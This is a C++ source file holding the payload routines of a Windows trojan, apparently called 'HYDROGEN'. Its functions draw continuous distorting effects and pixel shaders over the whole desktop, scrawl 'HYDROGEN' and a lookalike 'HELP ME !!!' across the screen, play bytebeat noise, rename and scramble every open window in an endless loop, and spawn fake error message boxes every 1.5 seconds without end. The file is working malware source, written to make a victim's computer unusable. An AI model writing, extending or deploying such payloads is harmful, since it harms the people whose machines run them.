#include "payloads.h"

HCRYPTPROV prov;
DWORD xs;

int random() {
	if (prov == NULL)
		if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
			ExitProcess(1);

	int out;
	CryptGenRandom(prov, sizeof(out), (BYTE*)(&out));
	return out & 0x7fffffff;
}

void SeedXorshift32(DWORD dwSeed) {
	xs = dwSeed;
}

DWORD Xorshift32() {
	xs ^= xs << 13;
	xs ^= xs >> 17;
	xs ^= xs << 5;
	return xs;
}

int RotateDC(HDC hdc, int Angle, POINT ptCenter) {
	int nGraphicsMode = SetGraphicsMode(hdc, GM_ADVANCED);
	XFORM xform;
	if (Angle != 0)
	{
		double fangle = (double)Angle / 180. * 3.1415926;
		xform.eM11 = (float)cos(fangle);
		xform.eM12 = (float)sin(fangle);
		xform.eM21 = (float)-sin(fangle);
		xform.eM22 = (float)cos(fangle);
		xform.eDx = (float)(ptCenter.x - cos(fangle) * ptCenter.x + sin(fangle) * ptCenter.y);
		xform.eDy = (float)(ptCenter.y - cos(fangle) * ptCenter.y - sin(fangle) * ptCenter.x);
		SetWorldTransform(hdc, &xform);
	}
	return nGraphicsMode;
}

LPCWSTR GenRandomUnicodeString(int len) {
	wchar_t* strRandom = new wchar_t[len + 1];

	for (int i = 0; i < len; i++) {
		strRandom[i] = (random() % 256) + 1024;
	}

	strRandom[len] = L'\0';

	return strRandom;
}

void ExecuteAudioSequence(int nSamplesPerSec, int nSampleCount, AUDIO_SEQUENCE pAudioSequence, AUDIOSEQUENCE_OPERATION pPreAudioOp, AUDIOSEQUENCE_OPERATION pPostAudioOp) {
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount * 2);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec * 2, 2, 16, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount * 2, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);

	if (pPreAudioOp) {
		pPreAudioOp(nSamplesPerSec);
	}

	pAudioSequence(nSamplesPerSec, nSampleCount, psSamples);

	if (pPostAudioOp) {
		pPostAudioOp(nSamplesPerSec);
	}

	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));

	Sleep(nSampleCount * 1000 / nSamplesPerSec);

	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}

	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}

void AudioSequence(PAUDIO_SEQUENCE_PARAMS pAudioParams) {
	ExecuteAudioSequence(pAudioParams->nSamplesPerSec, pAudioParams->nSampleCount, (AUDIO_SEQUENCE*)pAudioParams->pAudioSequence, (AUDIOSEQUENCE_OPERATION*)pAudioParams->pPreAudioOp, (AUDIOSEQUENCE_OPERATION*)pAudioParams->pPostAudioOp);
}

void AudioSequence1(int nSamplesPerSec, int nSampleCount, PSHORT psSamples) {
	for (INT t = 0; t < nSampleCount * 2; t++) {
		BYTE bFreq = (BYTE)((((t & t >> 8) - (t >> 13 & t)) & ((t & t >> 8) - (t >> 13))) ^ (t >> 8 & t));
		((BYTE*)psSamples)[t] = bFreq;
	}
}

void AudioSequence2(int nSamplesPerSec, int nSampleCount, PSHORT psSamples) {
	for (INT t = 0; t < nSampleCount * 2; t++) {
		BYTE bFreq = (BYTE)((t - (t >> 4 & t >> 8) & t >> 12) - 1);
		((BYTE*)psSamples)[t] = bFreq;
	}
}

void AudioSequence3(int nSamplesPerSec, int nSampleCount, PSHORT psSamples) {
	for (INT t = 0; t < nSampleCount * 2; t++) {
		BYTE bFreq = (BYTE)(((t >> 8 & t >> 4) >> (t >> 16 & t >> 8)) * t);
		((BYTE*)psSamples)[t] = bFreq;
	}
}

void AudioSequence4(int nSamplesPerSec, int nSampleCount, PSHORT psSamples) {
	for (INT t = 0; t < nSampleCount * 2; t++) {
		BYTE bFreq = (BYTE)(((t >> 10) & 42) * t);
		((BYTE*)psSamples)[t] = bFreq;
	}
}

void ExecutePayload(TROJAN_PAYLOAD payload, int nTime) {
	int dwStartTime = Time;
	for (int i = 0; Time < (dwStartTime + nTime); i++) {
		HDC hdcScreen = GetDC(NULL);
		payload(i, hdcScreen);
		ReleaseDC(NULL, hdcScreen);
		DeleteObject(hdcScreen);
	}
}

void Payload1(int t, HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();
	SelectObject(hdcScreen, CreateSolidBrush(RGB(t % 256, (t / 2) % 256, (t / 2) % 256)));
	PatBlt(hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, PATINVERT);
	Sleep(15);
}

void Payload2(int t, HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();
	t *= 10;
	BitBlt(hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, hdcScreen, ptScreen.x + t % szScreen.cx, ptScreen.y + t % szScreen.cy, NOTSRCERASE);
	SelectObject(hdcScreen, CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256)));
	PatBlt(hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, PATINVERT);
	Sleep(15);
}

void Payload3(int t, HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();
	HDC hcdc = CreateCompatibleDC(hdcScreen);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, szScreen.cx, szScreen.cy);
	SelectObject(hcdc, hBitmap);
	BitBlt(hcdc, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, hdcScreen, ptScreen.x, ptScreen.y, SRCCOPY);
	for (int i = ptScreen.x; i <= szScreen.cx / 10; i++) {
		for (int j = ptScreen.y; j <= szScreen.cy / 10; j++) {
			StretchBlt(hcdc, i * 10, j * 10, 10, 10, hcdc, i * 10, j * 10, 1, 1, SRCCOPY);
		}
	}
	BitBlt(hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, hcdc, ptScreen.x, ptScreen.y, SRCCOPY);

	DeleteObject(hcdc);
	DeleteObject(hBitmap);

	Sleep(100);
}

void Payload4(int t, HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();
	HDC hcdc = CreateCompatibleDC(hdcScreen);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, szScreen.cx, szScreen.cy);
	SelectObject(hcdc, hBitmap);
	BitBlt(hcdc, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);

	BLENDFUNCTION blf = { 0 };
	blf.BlendOp = AC_SRC_OVER;
	blf.BlendFlags = 0;
	blf.SourceConstantAlpha = 128;
	blf.AlphaFormat = 0;

	AlphaBlend(hdcScreen, ptScreen.x + t % 200 + 10, ptScreen.y - t % 25, szScreen.cx, szScreen.cy, hcdc, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, blf);
	
	DeleteObject(hcdc);
	DeleteObject(hBitmap);
	
	Sleep(20);
}

void Payload5(int t, HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();
	t *= 3;
	int x = random() % szScreen.cx;
	int y = random() % szScreen.cy;
	BitBlt(hdcScreen, x, y, t % szScreen.cx, t % szScreen.cy, hdcScreen, (x + t / 2) % szScreen.cx, y % szScreen.cy, SRCCOPY);
}

void Payload6(int t, HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();

	HDC hcdc = CreateCompatibleDC(hdcScreen);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, szScreen.cx, szScreen.cy);
	SelectObject(hcdc, hBitmap);
	BitBlt(hcdc, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);

	POINT p = { 0 };
	p.x = (szScreen.cx / 2);
	p.y = (szScreen.cy / 2);

	BLENDFUNCTION blf = { 0 };
	blf.BlendOp = AC_SRC_OVER;
	blf.BlendFlags = 0;
	blf.SourceConstantAlpha = 128;
	blf.AlphaFormat = 0;

	RotateDC(hdcScreen, 10, p);
	AlphaBlend(hdcScreen, 0, t, szScreen.cx, szScreen.cy, hcdc, 0, 0, szScreen.cx, szScreen.cy, blf);

	DeleteObject(hcdc);
	DeleteObject(hBitmap);
}

void Payload7(int t, HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();

	HDC hcdc = CreateCompatibleDC(hdcScreen);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, szScreen.cx, szScreen.cy);
	SelectObject(hcdc, hBitmap);
	BitBlt(hcdc, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);

	POINT p = { 0 };
	p.x = (szScreen.cx / 2);
	p.y = (szScreen.cy / 2);

	BLENDFUNCTION blf = { 0 };
	blf.BlendOp = AC_SRC_OVER;
	blf.BlendFlags = 0;
	blf.SourceConstantAlpha = 128;
	blf.AlphaFormat = 0;

	if (t % 2 == 0) {
		RotateDC(hdcScreen, 1, p);
	}
	else {
		RotateDC(hdcScreen, -1, p);
	}

	SetBkColor(hdcScreen, RGB(random() % 256, random() % 256, random() % 256));
	SetTextColor(hdcScreen, RGB(random() % 256, random() % 256, random() % 256));

	TextOut(hdcScreen, random() % szScreen.cx, random() % szScreen.cy, L"HYDROGEN", 8);
	
	AlphaBlend(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hcdc, 0, 0, szScreen.cx, szScreen.cy, blf);

	DeleteObject(hcdc);
	DeleteObject(hBitmap);
}

void Payload8(int t, HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();

	HDC hcdc = CreateCompatibleDC(hdcScreen);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, szScreen.cx, szScreen.cy);
	SelectObject(hcdc, hBitmap);
	BitBlt(hcdc, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);

	int nGraphicsMode = SetGraphicsMode(hdcScreen, GM_ADVANCED);
	XFORM xform;
	xform.eDx = 0;
	xform.eDy = 0;
	xform.eM11 = 1;
	xform.eM12 = 0.1;
	xform.eM21 = 0;
	xform.eM22 = 1;
	SetWorldTransform(hdcScreen, &xform);

	BLENDFUNCTION blf = { 0 };
	blf.BlendOp = AC_SRC_OVER;
	blf.BlendFlags = 0;
	blf.SourceConstantAlpha = 128;
	blf.AlphaFormat = 0;

	SetBkColor(hdcScreen, RGB(random() % 256, random() % 256, random() % 256));
	SetTextColor(hdcScreen, RGB(random() % 256, random() % 256, random() % 256));

	for (int i = 0; i < 5; i++) {
		TextOut(hdcScreen, random() % szScreen.cx, random() % szScreen.cy, L"ӉӬլҏ ӎӬ !!!", 11);
	}

	AlphaBlend(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hcdc, 0, 0, szScreen.cx, szScreen.cy, blf);

	DeleteObject(hcdc);
	DeleteObject(hBitmap);

	Sleep(50);
}

void Payload9(int t, HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();

	POINT pt[3];
	pt[0] = { 0,0 };
	pt[1] = { szScreen.cx,0 };
	pt[2] = { 25,szScreen.cy };
	PlgBlt(hdcScreen, pt, hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx + 25, szScreen.cy, NULL, 0, 0);

	SelectObject(hdcScreen, CreateSolidBrush(RGB(random() % 256, random() % 256, random() % 256)));
	PatBlt(hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, PATINVERT);

	Sleep(50);
}

void ExecuteShader(TROJAN_SHADER shader, int nTime) {
	int dwStartTime = Time;
	HDC hdcScreen = GetDC(NULL);
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();

	BITMAPINFO bmi = { 0 };
	HANDLE hHeap;
	PRGBQUAD prgbPixels;
	HDC hdcTempScreen;
	HBITMAP hbmScreen;

	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = szScreen.cx;
	bmi.bmiHeader.biHeight = szScreen.cy;

	hHeap = GetProcessHeap();
	prgbPixels = (PRGBQUAD)HeapAlloc(hHeap, 0, szScreen.cx * szScreen.cy * sizeof(RGBQUAD));

	hdcTempScreen = CreateCompatibleDC(hdcScreen);
	hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbPixels, NULL, 0);
	SelectObject(hdcTempScreen, hbmScreen);

	for (int i = 0; Time < (dwStartTime + nTime); i++) {
		hdcScreen = GetDC(NULL);
		BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);
		for (int j = 0; j < szScreen.cx * szScreen.cy; j++) {
			prgbPixels[j].rgb = shader(i, j, prgbPixels[j].rgb);
		}
		BitBlt(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen);
		DeleteObject(hdcScreen);
		Sleep(10);
	}

	DeleteObject(hbmScreen);
	DeleteDC(hdcTempScreen);
}

COLORREF Shader1(int t, int num, COLORREF rgb) {
	return (rgb * 2) % (RGB(255, 255, 255));
}

COLORREF Shader2(int t, int num, COLORREF rgb) {
	int r = GetRValue(rgb);
	int g = GetGValue(rgb);
	int b = GetBValue(rgb);
	return RGB((r + 100) % 256, ((r + g + b) / 4 + t) % 256, ((r + g + b) / 4 + num) % 256) % (RGB(255, 255, 255)) + t * 10;
}

COLORREF Shader3(int t, int num, COLORREF rgb) {
	int r = GetRValue(rgb);
	int g = GetGValue(rgb);
	int b = GetBValue(rgb);
	return (RGB((2 * r) % 256, (b + t) % 256, (g + num) % 256) + int(sqrt(num >> t / (r + 1))) / 10) % (RGB(255, 255, 255));
}

COLORREF Shader4(int t, int num, COLORREF rgb) {
	int r = GetRValue(rgb);
	int g = GetGValue(rgb);
	int b = GetBValue(rgb);
	return (RGB((r + g + b) / 3, (r + g + b) / 3, (r + g + b) / 3) + t - int(sqrt(num))) % (RGB(255, 255, 255));
}

COLORREF Shader5(int t, int num, COLORREF rgb) {
	return (rgb - Xorshift32() % int(sqrt(num + 1))) % (RGB(255, 255, 255));
}

COLORREF Shader6(int t, int num, COLORREF rgb) {
	return (t * num) % (RGB(255, 255, 255));
}

COLORREF Shader7(int t, int num, COLORREF rgb) {
	return (Xorshift32() % 0x100) * 0x010101;
}

BOOL CALLBACK EnumChildWindowsProc(HWND hwnd, LPARAM lParam) {
	SendMessageTimeout(hwnd, WM_SETTEXT, NULL, (LPARAM)GenRandomUnicodeString(random() % 10 + 10), SMTO_ABORTIFHUNG, 100, NULL);

	RECT rcWindow;
	GetWindowRect(hwnd, &rcWindow);
	int cxWindow = rcWindow.right - rcWindow.left;
	int cyWindow = rcWindow.bottom - rcWindow.top;
	HDC hdcWindow = GetDC(hwnd);
	BitBlt(hdcWindow, 0, 0, cxWindow, cyWindow, hdcWindow, random() % 21 - 10, random() % 41 - 20, SRCCOPY);
	ReleaseDC(NULL, hdcWindow);
	DeleteObject(hdcWindow);

	EnumChildWindows(hwnd, EnumChildWindowsProc, NULL);
	return true;
}

void WindowsCorruptionPayload() {
	for (;;) {
		EnumChildWindows(NULL, EnumChildWindowsProc, NULL);
	}
}

void MessageBoxThread() {
	LPCWSTR strText = GenRandomUnicodeString(random() % 10 + 10);
	LPCWSTR strTitle = GenRandomUnicodeString(random() % 10 + 10);
	if (random() % 2 == 0) {
		MessageBox(NULL, strText, strTitle, MB_ABORTRETRYIGNORE | MB_ICONWARNING);
	}
	else {
		MessageBox(NULL, strText, strTitle, MB_RETRYCANCEL | MB_ICONERROR);
	}
}

void MessageBoxPayload() {
	for (;;) {
		CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(MessageBoxThread), NULL, 0, NULL);
		Sleep(1500);
	}
}